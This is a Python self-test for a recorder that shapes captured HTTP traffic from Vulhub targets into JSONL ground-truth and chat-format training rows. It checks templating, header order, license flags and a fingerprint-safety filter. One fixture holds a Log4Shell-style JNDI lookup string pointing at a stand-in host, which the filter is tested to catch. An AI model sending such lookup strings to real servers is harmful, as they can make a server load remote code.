#!/usr/bin/env python3
"""Self-test for the Vulhub recorder's JSONL shaping -- no docker, no mitmproxy, no network.

Feeds a handful of canned fake flows through record_addon.extract_and_build() (the same function
the live mitmdump addon calls per-flow) and asserts:
  - ground-truth.jsonl rows carry the fields the design doc specifies, with headers preserved as
    ordered pairs and volatile fields (Date, ETag, Set-Cookie, long tokens) templated;
  - messages.jsonl rows match mlx-lm's native chat format (system/user/assistant, no baked
    ChatML <|im_start|> tokens) with the user turn in the exact "Method: X\\nPath: Y" shape
    LlmPromptBuilder uses;
  - the fingerprint-safety gate drops a response that echoes a scanner signature from
    messages.jsonl while still recording it (flagged) in ground-truth.jsonl;
  - an internal_only target's license_flag survives into the ground-truth row unchanged.

Run: python3 selftest.py  (exit 0 = all checks passed)
"""
import os
import sys

from record_addon import extract_and_build


class FakeHeaders(list):
    """A list of (name, value) pairs that also answers mitmproxy's .items(multi=True) shape, so
    the same fake flow exercises _headers_as_list()'s mitmproxy-Headers branch too."""
    def items(self, multi=False):
        return list(self)


class FakeRequest:
    def __init__(self, method, path, headers=None, body=''):
        self.method = method
        self.path = path
        self.headers = FakeHeaders(headers or [])
        self.content = body.encode('utf-8')


class FakeResponse:
    def __init__(self, status_code, headers=None, body=''):
        self.status_code = status_code
        self.headers = FakeHeaders(headers or [])
        self.content = body.encode('utf-8')


class FakeFlow:
    def __init__(self, request, response):
        self.request = request
        self.response = response


failures = []


def check(label, condition):
    status = 'ok' if condition else 'FAIL'
    print(f'[{status}] {label}')
    if not condition:
        failures.append(label)


def main():
    # --- Case 1: a clean, plausible capture (Tomcat 401 on /manager/html) ---------------------
    flow = FakeFlow(
        FakeRequest('GET', '/manager/html'),
        FakeResponse(
            401,
            headers=[
                ('Server', 'Apache-Coyote/1.1'),
                ('WWW-Authenticate', 'Basic realm="Tomcat Manager Application"'),
                ('Date', 'Tue, 19 Aug 2026 10:00:00 GMT'),
                ('Set-Cookie', 'JSESSIONID=A1B2C3D4E5F60718293A4B5C6D7E8F90; Path=/; HttpOnly'),
            ],
            body='<html><body><h1>401 Unauthorized</h1><p>tok=deadbeef001122334455667788990011</p></body></html>',
        ),
    )
    os.environ['VULHUB_TARGET'] = 'tomcat-cve-2020-1938'
    os.environ['VULHUB_LICENSE_FLAG'] = 'oss'
    os.environ.pop('VULHUB_SERVER_LABEL', None)
    gt, msg = extract_and_build(flow)

    check('ground-truth: method/path/status carried through',
          gt['method'] == 'GET' and gt['path'] == '/manager/html' and gt['status'] == 401)
    check('ground-truth: source_container tagged from env',
          gt['source_container'] == 'tomcat-cve-2020-1938')
    check('ground-truth: license_flag carried through',
          gt['license_flag'] == 'oss')
    check('ground-truth: resp_headers preserved as ordered pairs (Server first)',
          gt['resp_headers'][0] == ('Server', 'Apache-Coyote/1.1') if isinstance(gt['resp_headers'][0], tuple)
          else gt['resp_headers'][0] == ['Server', 'Apache-Coyote/1.1'])
    check('ground-truth: Date header templated',
          any(k == 'Date' and v == '{{DATE}}' for k, v in gt['resp_headers']))
    check('ground-truth: Set-Cookie session id templated, attrs kept',
          any(k == 'Set-Cookie' and v.startswith('JSESSIONID={{SESSION_ID}}') and 'HttpOnly' in v
              for k, v in gt['resp_headers']))
    check('ground-truth: long hex token in body templated',
          '{{TOKEN}}' in gt['resp_body'] and 'deadbeef001122334455667788990011' not in gt['resp_body'])
    check('ground-truth: not flagged as fingerprint-poisoned',
          gt['fingerprint_poisoned'] is False)

    check('messages: exactly one row produced', msg is not None)
    if msg is not None:
        roles = [m['role'] for m in msg['messages']]
        check('messages: native chat format, 3 turns system/user/assistant',
              roles == ['system', 'user', 'assistant'])
        check('messages: no baked ChatML tokens in any turn',
              all('<|im_start|>' not in m['content'] and '<|im_end|>' not in m['content']
                  for m in msg['messages']))
        user_turn = msg['messages'][1]['content']
        check('messages: user turn is exact "Method: X\\nPath: Y" shape',
              user_turn == 'Method: GET\nPath: /manager/html')
        system_turn = msg['messages'][0]['content']
        check('messages: system prompt carries the real captured Server banner, not the fallback label',
              'Apache-Coyote/1.1' in system_turn)
        check('messages: assistant turn is the templated response body',
              msg['messages'][2]['content'] == gt['resp_body'])

    # --- Case 2: fingerprint-poisoned response (echoes a nuclei matcher string) ---------------
    poisoned_flow = FakeFlow(
        FakeRequest('GET', '/solr/admin/cores'),
        FakeResponse(500, headers=[('Server', 'Apache Solr/8.11.0')],
                     body='<html>Error processing ${jndi:ldap://x.example.com}: nuclei matcher triggered</html>'),
    )
    os.environ['VULHUB_TARGET'] = 'log4j-cve-2021-44228'
    gt2, msg2 = extract_and_build(poisoned_flow)
    check('poisoned capture: still written to ground-truth.jsonl (the oracle keeps everything)',
          gt2['resp_body'] != '')
    check('poisoned capture: flagged fingerprint_poisoned=true',
          gt2['fingerprint_poisoned'] is True)
    check('poisoned capture: hard-dropped from messages.jsonl',
          msg2 is None)

    # --- Case 3: internal_only target -- license_flag must survive verbatim -------------------
    weblogic_flow = FakeFlow(
        FakeRequest('GET', '/console'),
        FakeResponse(200, headers=[('Server', 'Oracle-Application-Server')],
                     body='<html><title>WebLogic Server Administration Console</title></html>'),
    )
    os.environ['VULHUB_TARGET'] = 'weblogic-cve-2020-14882'
    os.environ['VULHUB_LICENSE_FLAG'] = 'internal_only'
    gt3, msg3 = extract_and_build(weblogic_flow)
    check('internal_only target: license_flag == internal_only on the ground-truth row',
          gt3['license_flag'] == 'internal_only')
    check('internal_only target: still produces a messages.jsonl row (filter is content-based, '
          'not license-based -- license gating happens downstream, at corpus-assembly time)',
          msg3 is not None)

    # --- Case 4: empty/binary body must not enter messages.jsonl ------------------------------
    empty_flow = FakeFlow(FakeRequest('GET', '/favicon.ico'), FakeResponse(200, body=''))
    _, msg4 = extract_and_build(empty_flow)
    check('empty body: no messages.jsonl row produced', msg4 is None)

    print()
    if failures:
        print(f'{len(failures)} check(s) FAILED:')
        for f in failures:
            print(f'  - {f}')
        return 1
    print('All checks passed.')
    return 0


if __name__ == '__main__':
    sys.exit(main())
